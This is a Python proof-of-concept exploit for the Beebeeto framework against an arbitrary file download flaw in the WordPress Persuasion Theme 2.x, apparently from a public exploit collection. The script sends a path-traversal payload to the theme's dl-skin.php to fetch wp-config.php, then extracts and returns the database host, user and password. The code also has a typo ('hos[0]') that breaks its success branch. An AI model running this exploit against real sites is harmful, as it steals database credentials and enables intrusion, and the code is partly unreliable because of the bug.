#!/usr/bin/env python
# encoding: utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0029',  # 由Beebeeto官方编辑
            'name': 'Wordpress Persuasion Theme 2.x 任意文件下载 POC',  # 名称
            'author': 't0nyhj',  # 作者
            'create_date': '2014-09-25',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议所使用的第三层协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress Persuasion Theme',  # 漏洞所涉及的应用名称
            'vul_version': ['2.x'],  # 受漏洞影响的应用版本
            'type': 'Arbitrary File Download',  # 漏洞类型
            'tag': ['Wordpress', 'Persuasion Theme', '任意文件下载漏洞'],  # 漏洞相关tag
            'desc': 'Wordpress Persuasion Theme 2.x 任意文件下载 ，通过此漏洞可以下载服务器上的任意可读文件。',  # 漏洞描述
            'references': ['http://www.exploit-db.com/exploits/30443/',  # 参考链接
                           ],
        },
    }


    @classmethod
    def verify(cls, args):  # 实现验证模式的主函数
        vul_url = args['options']['target'] + '/wp-content/themes/persuasion/lib/scripts/dl-skin.php'
        payload = {
                '_mysite_download_skin':'../../../../../wp-config.php',
                '_mysite_delete_skin_zip':''}
        data = urllib.urlencode(payload)
        if args['options']['verbose']:
            print '[*] {url} - Getting wp-config.php ...'.format(url=args['options']['target'])
        req = urllib2.Request(vul_url, data)
        # req = urllib2.Request(vul_url)
        response = urllib2.urlopen(req).read()
        if 'DB_USER' in response and 'DB_HOST' in response and 'WordPress' in response:
            pattern_1 = re.compile('\'DB_HOST\'\, (.*)\)')
            pattern_2 = re.compile('\'DB_USER\'\, (.*)\)')
            pattern_3 = re.compile('\'DB_PASSWORD\'\, (.*)\)')
            host = pattern_1.findall(response)
            user = pattern_2.findall(response)
            password = pattern_3.findall(response)
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            args['poc_ret']['host'] = hos[0]
            args['poc_ret']['db_user'] = user[0]
            args['poc_ret']['db_password'] = password[0]
        else:
            args['success'] = False
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
